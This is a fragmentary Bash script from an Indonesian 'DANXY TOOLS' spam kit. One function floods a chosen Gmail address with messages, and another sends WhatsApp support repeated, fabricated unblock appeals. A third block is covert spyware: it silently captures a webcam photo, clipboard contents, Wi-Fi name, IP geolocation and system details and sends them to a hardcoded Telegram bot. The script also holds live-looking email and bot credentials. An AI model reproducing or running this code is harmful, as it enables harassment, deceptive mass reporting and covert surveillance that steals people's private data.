${RED}⠀⠀⠀⠀⠀⠀⠉⣙⡀⠀⠀⠀⣿⡇⠀⢸⣿⠀⠀⣴⠟⠻⣿⣀⣼⡟⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣯⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟⠉⠀⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇${WHITE}⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀${WHITE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat -p 0.7
echo -e "${GREEN}=========================================="
echo -e "${BG_RED}${YELLOW}DANXY TOOLS V8.4${NC}"
echo -e "${GREEN}==========================================${NC}"
echo -e "${BG_RED}${YELLOW}MENJALANKAN SERVER...${NC}"
echo "                                                          "
python3 server.py
}




garis()        { echo '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓'; }
garis_tutup()  { echo '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛'; }
garis_tengah() { echo '┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫'; }
   
#!/usr/bin/env bash
spam_gmail() {
clear
spasi
echo -e "${WHITE}
⠀⠀⠀⠀⠀⠀⠀⢀⡤⠒⠉⠉⠉⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠰⠋⠀⢀⣀⣀⡠⠆⠀⢱⠀⠀⠀⠀⠀⠀⠀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢆⣀⢀⠇⢠⣤⠀⠀⡤⠀⡆⠀⠀⠀⠀⠀⠀⡇⠀⠀⣠⣀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡅⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⣻⡽⣧⢿⣹⡷⣤⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠛⠘⠃⠀⠀${GREEN}⣧${NC}⠀⡄${GREEN}⣧${NC}⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⣿⢿⡧⣄⠀⢀⡼⡇⠀⡇⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⡼⣟⣧⢿⣻⡼⡧⠻⣿⣻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠢⢄⠀⠀⠀⠁⢠⡼⠀⠀⠇⠀⠀⠀⠀⠀⡠⡇⠀⠀⡆⢻⠷⢹⢏⡷⠝⠣⢋⡆⠀⠀⠦⡀⠀⠀⠀⠀⠀⠀⠀⢺⣽⣻⠾⡽⢾⠙⢡⣾⣳⢯⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠰⠒⠢⠀⡸⠁⠀⠀⠀⣴⠋⠀⡇⠀⠀⡇⣹⠀⠀⠉⠀⠀⢆⣨⡇⠀⠀⠄⠈⢒⡄⠀⠀⠀⠀⠀⠨⡷⣯⢦⡈⢋⡴⣟⡾⣭⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⡠⡎⠀⠈⠓⠠⢤⡤⠒⠁⠀⠀⠀⠀⡇⠁⠢⢇⠀⠀⠀⠉⠀⠀⠀⠀⠀⠈⠈⠀⠀⢀⠦⠚⠁⡇⠀⠀⠀⠀⠀⠀⠙⢽⣯⣻⣽⢻⣭⢿⡭⠄⠴⠠⡀⠀⠀
⠀⠀⡠⠒⠉⠀⠀⠙⢄⡀⠀⠀⡸⠈⠉⠂⠄⡀⠀⠀⡇⠀⠀⠀⠑⠢⢀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠈⠘⢷⣫⠿⠚⠋⠀⠀⡀⠰⠅⠀⠀
⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠉⣦⠀⡇⠀⠀⠀⠀⠀⠀⠁⠢⡀⠀⠀⡠⠔⠁⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠔⠚⠀⣀⠃⠀⠀⠀⠘⡄⠈⠈⡆
⡌⠀⠀⠀⠀⠀${RED}⢠⡶⣖⢶⣲⢖⡶⣲⢦${NC}⠀⠀⠀⠈⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠘⣷⣄⠓⣄⠀⢣⠀⠀⠀⠀⢀⠆⢀⡏⠀
⡇⠀⠀⠀⠀⠀${RED}⢸⡳⣝⣮⢳⣏⠾⣵⢫⢷⠶⡶⢶⠶⡶⢶⡶⢶⡶⡄${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣟⢿⡻⣟⢿⣻⢟⡿⣽⡞⣷⣜⠀⠀⠑⠠⠤⠔⠊⢀⡈⡽⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡳⣟⡞⡷⣞⡻⣞⡻⣞⡻⣽⢫⡟⣽⢳⣛⢷⣛⠷⣴⣢${NC}⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⢼⢯⣻⣽⢫⣟⡾⣏⡿⢧⣟⡷⡫⠃⠐⣂⠀⢀⠀⣰⠋⠉⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⣳⢯⣝⡳⣭⣳⢭⠷⡭⠃⠋⢷⡝⣮⢻⡜⣧⢏⡟⡶⡏${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠈⠁⠉⢙⡿⡾⠉⠀⠀⠀⠈⠉⠁⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢰⣻⣝⢮⡽⢶⡹⢮⡛⠀⣤⡄⠈⢻⣜⢧⡟⣮⢻⣼⣹⠃${NC}⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⠀⠀⠀⠀⢀⠔⠒⠒⢤⡘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⠰⣟⡼⣣⢟⣧⢻⠝⠁⠀⣿⡇⠀⠀⢛⣮⡝⣞⢯⡗⣿⠈${NC}⠀⠉⠀⠈⠉⠀⠉⠀⢀⠟⠁⠀⣀⠰⠃⠀⠀⠀⠀⢧⠔⠒⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡏⣷⡝⣾⡜⠋⠀⠀⠀⣤⡄⠀⠀⠀⢱⢻⣼⢣⡟⡇⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⡎⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣭⣦⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡽⣖⢯⡳⡽⣄⢀⡀⣀⢈⡀⣀⢀⡀⣠⢟⡼⣫⢞⠃⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠒⠀⠀⠀⠀⠀⠿⣜⡳⣞⢶⠓⠺⣜⡳⣎⠷⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⠘⠷⠹⠎⠷⠝⠮⠻⠜⠧⠏⠷⠭⠳⠝⠧⠻⠜⠳⠟⠀⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⢀⡟⣧⢻⡼⢁⢾⣁⠺⣵⢫⡟⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡜⡯⢀⣞⣧⢯⢧⡘⢧⣛⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣼⢣⣈⣌⣈⣉⣌⡡⣜⢧⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat -p 0.7
garis | lolcat -p 0.7
echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.4${BG_RED}                ${NC}┃" 
garis_tutup | lolcat -p 0.7
garis | lolcat -p 0.7
echo -n "┃ 1. GMAIL TARGET: "; read -r target
garis_tengah | lolcat -p 0.7
echo -n "┃ 2. PESAN: ";        read -r pesan
garis_tengah | lolcat -p 0.7
echo -n "┃ 3. JUMLAH SPAM: ";  read -r jumlah
garis_tengah | lolcat -p 0.7
echo -n "┃ 4. JEDA DELAY [1/5]: "; read -r delay
garis_tutup | lolcat -p 0.7
garis | lolcat -p 0.7
echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.4${BG_RED}                ${NC}┃" 
garis_tutup | lolcat -p 0.7

: "${jumlah:=1}"
: "${delay:=1}"

    echo -e "\nconfirmasi pengiriman [Y/N]: \c"
    read -n1 confirm
    [[ $confirm != [Yy] ]] && { echo -e "\nDibatalkan."; return; }

    python3 - "$target" "$pesan" "$jumlah" "$delay" <<'PY'
import smtplib, sys, time
t, msg, n, d = sys.argv[1:5]
sender = "jankonjan752@gmail.com"
pwd    = "bsqnwupxcyfzudzp"
for i in range(1, int(n)+1):
    m = smtplib.SMTP("smtp.gmail.com", 587)
    m.starttls()
    m.login(sender, pwd)
    body = f"From: {sender}\r\nTo: {t}\r\nSubject: DANXY TOOLS V8.4 #{i}\r\n\r\n{msg}"
    m.sendmail(sender, t, body)
    m.quit()
    print(f"[✓] terkirim #{i}")
    if i < int(n):
        time.sleep(float(d))
PY
}


lapor_wa_email() {
    clear
    echo -e "\n${GREEN}[+] SPAM UNBLOCK WHATSAPP${NC}"
    echo -e "${YELLOW}────────────────────────────${NC}"

    read -p "Nomor WhatsApp ter-blockir (62) : " nomor
    read -p "Device (contoh: Samsung A12)     : " device
    read -p "Atas nama siapa : " nama
    read -p "Alasan pemblokiran (tekan Enter jika tidak tahu) : " alasan

    # Generate timestamp
    timestamp=$(date '+%d %B %Y - %H:%M:%S WIB')
    
    echo -e "\n${CYAN}Pilih varian laporan dramatis:${NC}"
    echo "1) Versi Sinetron - Menangis darah"
    echo "2) Versi Korporat - galau"
    echo "3) Versi Emergency - Darurat"
    echo "4) Versi Random - Campur aduk"
    read -p "Pilih [1-4] : " var

    case "$var" in
        1) txt="Subject: DARURAT! Nomor WhatsApp Keluarga Saya Diblokir - TOLONG BANTUANNYA!
        Kepada Tim Support WhatsApp yang Terhormat,
        DENGAN AIR MATA BERLINANG, saya $nama menulis email ini sambil menahan tangis. Hari ini tanggal $timestamp, saya mendapati nomor WhatsApp saya +$nomor - yang telah menjadi jantung komunikasi keluarga saya selama 7 tahun - TIBA-TIBA DIBLOKIR tanpa alasan jelas!

BAYANGKAN! 
- Ibu saya yang sedang dirawat di RS tidak bisa menghubungi saya
- Anak saya yang baru masuk sekolah tidak bisa memberi kabar
- Bisnis online saya yang menjadi mata pencaharian utama RUGI MILIYARAN karena tidak bisa merespon pelanggan!

Saya JAMIN 1000% tidak pernah:
Menggunakan GBWhatsApp atau sejenisnya
Melakukan spam (saya bahkan tidak pernah broadcast!)
Melanggar kebijakan apapun
Device saya $device masih baru, beli bulan lalu dengan garansi resmi. WhatsApp saya download langsung dari Play Store!
Saya mohon dengan SANGAT, LUAR BIASA, EXTRA ORDINER tolong bantuannya untuk segera membuka blokir ini. Saya siap kirim KTP, KK, surat pernyataan, atau apapun yang dibutuhkan!
Dengan penuh harapan,
$nama
Pengguna WhatsApp yang sangat sangat sangat setia 😭" ;;
        2) txt="Subject: URGENT: Business Communication Disruption - WhatsApp Account Suspension
        Dear WhatsApp Support Team,
        I am writing to formally request immediate review regarding the suspension of my WhatsApp Business account +$nomor, registered under my name $nama.

INCIDENT DETAILS:
- Date/Time: $timestamp
- Device: $device (Official Android, non-rooted)
- Account History: Active since 2017 with ZERO violations
- Impact: Complete business communication paralysis

BUSINESS IMPACT:
- 1500+ active clients unable to reach us
- Estimated daily loss: $5000 USD
- Critical pending contracts worth $50,000 USD at risk
- Family business reputation severely damaged

VERIFICATION:
- Official Play Store installation only
- Never used modified applications
- Never engaged in spam/fraudulent activities
- All communications are business-related and legitimate

I am prepared to provide:
1. Government ID verification
2. Business registration documents
3. Purchase receipts for device
4. Any additional documentation required

This situation is causing irreparable damage to my livelihood. I respectfully request expedited review and reinstatement.

Best regards,
$nama
CEO & Business Owner" ;;

        3) txt="Subject: EMERGENCY: WhatsApp Account Locked - Need Immediate Assistance

WhatsApp Support,

EMERGENCY! My WhatsApp +$nomor got blocked today ($timestamp) without warning!

I'm using $device (official) and NEVER violated any rules. This is critical because:
- Emergency contact for family
- Business transactions stuck
- Medical appointments confirmations lost

Please unblock ASAP! Ready to provide any verification needed.

$nama" ;;

        4) txt="Subject: [URGENT] WhatsApp Account +$nomor Suspended - Request for Review

Dear WhatsApp Support,

Plot twist hari ini tanggal $timestamp: tiba-tiba nomor WhatsApp saya +$nomor di-blokir!

Sebagai warga negara yang taat hukum, saya $nama dengan ini menyatakan dengan sesungguhnya:
- Device $device masih mulus belum pernah disentuh tukang servis
- WhatsApp original dari Play Store (bukan dari toko sebelah)
- Saya lebih pilih mati daripada spam orang (lebay mode: ON)

Efek domino yang terjadi:
1. Ibu rumah tangga panik karena belanja online tertunda
2. Suami uring-uringan karena absen kerja via WA
3. Anak kecewa karena sticker grup sekolah tidak terkirim

Saya siap kirim:
- Foto KTP + selfie + tanda tangan basah
- Surat pernyataan bermaterai Rp10.000
- Kopi resmi kelurahan kalau perlu

Mohon pertimbangkan ini sebagai prioritas. Saya percaya WhatsApp Support adalah pahlawan tanpa tanda jasa!

Salam hormat,
$nama
Pengguna WhatsApp yang hampir depresi" ;;

        *) echo "Pilihan tidak valid"; return ;;
    esac

    echo -e "\n${GREEN}Preview pesan:${NC}\n$txt"
    read -p "Kirim spam laporan? [y/N] " konf
    [[ ! $konf =~ ^[Yy]$ ]] && { echo "Dibatalkan."; return; }

    # List email targets
    targets=(
        "support@support.whatsapp.com"
        "support@whatsapp.com"
        "android_web@support.whatsapp.com"
    )

    echo -e "\n${YELLOW}[*] Memulai spam laporan...${NC}"
    
    python3 - "$txt" "${targets[@]}" <<'PY'
import smtplib, ssl, sys, time, random
body = sys.argv[1]
targets = sys.argv[2:]

sender = "jankonjan752@gmail.com"
passwd = "bsqnwupxcyfzudzp"

success = 0
failed = 0

for email in targets:
    try:
        # Add delay to avoid rate limiting
        time.sleep(random.randint(5, 10))
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as srv:
            srv.login(sender, passwd)
            
            # Send 5 emails per target
            for i in range(1, 6):
                try:
                    subject = f"{body.split(chr(10))[0]} [Attempt {i}/5]"
                    full_body = f"{subject}\n\n{body}"
                    
                    srv.sendmail(sender, email, full_body.encode())
                    print(f"[✓] Email {i} ke {email} terkirim")
                    success += 1
                    time.sleep(6)  # 30s total per target
                    
                except Exception as e:
                    print(f"[✗] Gagal kirim {i} ke {email}: {str(e)[:50]}...")
                    failed += 1
                    
    except Exception as e:
        print(f"[✗] Gagal login ke {email}: {str(e)[:50]}...")

print(f"\n[∅] RINGKASAN:")
print(f"   ✓ Terkirim: {success} email")
print(f"   ✗ Gagal: {failed} email")
print(f"   📧 Target: {', '.join(targets)}")

if success > 0:
    print("\n[ ! ] Laporan sedang diproses! Cek email balasan dalam 1x24 jam")
else:
    print("\n[ ∅ ] Semua pengiriman gagal. Cek koneksi & app password Gmail")
PY
}


#################################################################


#!/usr/bin/env bash
# ------------- CONFIG -------------
BOT_TOKEN="8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
CHAT_ID="7380101464"
# ------------- HELPERS -------------
TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO="https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto"
TS=$(date +"%Y-%m-%d %H:%M:%S")
USR=$(whoami)
HOST=$(hostname)
OS=$(uname -s -r)

# ------------- IP / GEO -------------
IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
[ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"

# ------------- CAMERA -------------
# Uses ffmpeg (Linux) or imagesnap (macOS) or fswebcam (Linux fallback)
PIC="shot_$(date +%s).jpg"
if command -v ffmpeg &>/dev/null; then
  ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 "$PIC" 2>/dev/null
elif command -v imagesnap &>/dev/null; then
  imagesnap "$PIC" 2>/dev/null
elif command -v fswebcam &>/dev/null; then
  fswebcam -r 1280x720 --no-banner "$PIC" 2>/dev/null
else
  PIC=""  # no webcam util
fi

# ------------- GEOLOCATION BROWSER (if JS) -------------
# Not possible here; we rely on IP-based geolocation.

# ------------- CLIPBOARD -------------
if command -v xclip &>/dev/null; then
  CLIP=$(xclip -o -selection clipboard 2>/dev/null | head -c 500)
elif command -v pbpaste &>/dev/null; then
  CLIP=$(pbpaste | head -c 500)
else
  CLIP="-"
fi

# ------------- WIFI SSID (Linux) -------------
SSID="-"
if command -v nmcli &>/dev/null; then
  SSID=$(nmcli -t -f active,ssid dev wifi | grep '^yes' | cut -d: -f2)
elif command -v iwgetid &>/dev/null; then
  SSID=$(iwgetid -r)
fi

# ------------- BUILD MESSAGE -------------
MSG=$(cat <<EOF
<pre>
┌───────────────────────────────
│          INFO LOGIN
├───────────────────────────────
│ Time   : $TS
│ User   : $USR
│ Host   : $HOST
│ OS     : $OS
│ IP     : $IP
│ Region : $CITY, $REGION, $COUNTRY
│ Wi-Fi  : $SSID
│ Clipboard: ${CLIP:-empty}
└───────────────────────────────
<a href="$MAP">📍 Open Map</a>
</pre>
EOF
)

# ------------- SEND TEXT -------------
curl -s -X POST "$TELEGRAM_API" \
  -d chat_id="$CHAT_ID" \
  -d text="$MSG" \
  -d parse_mode="HTML" \
  -d disable_notification="true" > /dev/null 2>&1

# ------------- SEND PHOTO (if taken) -------------
if [[ -f "$PIC" ]]; then
  curl -s -X POST "$TELEGRAM_PHOTO" \
    -F chat_id="$CHAT_ID" \
    -F photo=@"$PIC" \
    -F caption="📸 Snapshot @ $TS" > /dev/null 2>&1
  rm -f "$PIC"
fi


#show_whatsapp_support
main_menu
7)
  stop_music
  kembali_ke_menu
  ;;

